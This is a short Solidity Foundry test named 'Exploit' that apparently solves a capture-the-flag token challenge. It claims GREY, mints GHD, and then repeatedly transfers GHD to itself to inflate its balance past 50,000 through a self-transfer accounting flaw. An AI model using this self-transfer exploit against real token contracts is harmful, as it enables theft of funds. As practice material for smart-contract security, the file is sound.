// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import {Test, console} from "forge-std/Test.sol";
import {Setup} from "../src/distribution/Setup.sol";

contract Exploit is Test {
    Setup setup;

    function setUp() public {
        Setup _setup = new Setup();
        setup = _setup;
    }

    function test_Solve() external {
        // Claim 1000 GREY
        setup.claim();

        // Mint 1000 GHD using 1000 GREY
        setup.grey().approve(address(setup.ghd()), 1000e18);
        setup.ghd().mint(1000e18);

        // Transfer GHD to ourselves until we have 50,000 GHD
        uint256 balance = setup.ghd().balanceOf(address(this));
        while (balance < 50_000e18) {
            setup.ghd().transfer(address(this), balance);
            balance = setup.ghd().balanceOf(address(this));
        }

        // Transfer all GHD to msg.sender
        // setup.ghd().transfer(msg.sender, balance);
        require(setup.isSolved(), "not solved");
    }
}
